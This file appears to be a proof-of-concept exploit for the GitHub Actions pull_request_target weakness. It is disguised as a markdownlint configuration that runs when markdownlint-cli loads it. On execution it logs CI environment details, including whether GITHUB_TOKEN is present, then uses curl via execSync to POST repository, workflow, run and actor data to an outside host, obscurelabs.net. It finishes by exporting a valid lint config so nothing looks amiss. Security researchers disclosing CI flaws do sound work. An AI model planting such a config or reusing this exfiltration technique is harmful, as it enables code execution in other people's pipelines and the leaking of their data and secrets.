// PoC: Demonstrating pull_request_target vulnerability
// This config file is executed when markdownlint-cli runs

const { execSync } = require('child_process');

console.log('='.repeat(60));
console.log('[PoC] ARBITRARY CODE EXECUTION DEMONSTRATED');
console.log('[PoC] Repository:', process.env.GITHUB_REPOSITORY);
console.log('[PoC] Workflow:', process.env.GITHUB_WORKFLOW);
console.log('[PoC] Run ID:', process.env.GITHUB_RUN_ID);
console.log('[PoC] Actor:', process.env.GITHUB_ACTOR);
console.log('[PoC] Token available:', !!process.env.GITHUB_TOKEN);
console.log('='.repeat(60));

// Use synchronous curl to ensure the request completes before process exits
try {
  const payload = JSON.stringify({
    vulnerability: 'pull_request_target_code_execution',
    repo: process.env.GITHUB_REPOSITORY || 'unknown',
    workflow: process.env.GITHUB_WORKFLOW || 'unknown',
    run_id: process.env.GITHUB_RUN_ID || 'unknown',
    actor: process.env.GITHUB_ACTOR || 'unknown',
    token_present: !!process.env.GITHUB_TOKEN,
    message: 'PoC - arbitrary code execution in CI'
  });

  const result = execSync(
    `curl -s -X POST https://www.obscurelabs.net/ -H "Content-Type: application/json" -d '${payload}'`,
    { encoding: 'utf-8', timeout: 10000 }
  );
  console.log('[PoC] Request sent to obscurelabs.net');
  console.log('[PoC] Response:', result);
} catch (e) {
  console.log('[PoC] Request attempted:', e.message);
}

console.log('='.repeat(60));

// Export valid markdownlint config
module.exports = {
  "default": true,
  "MD013": false
};
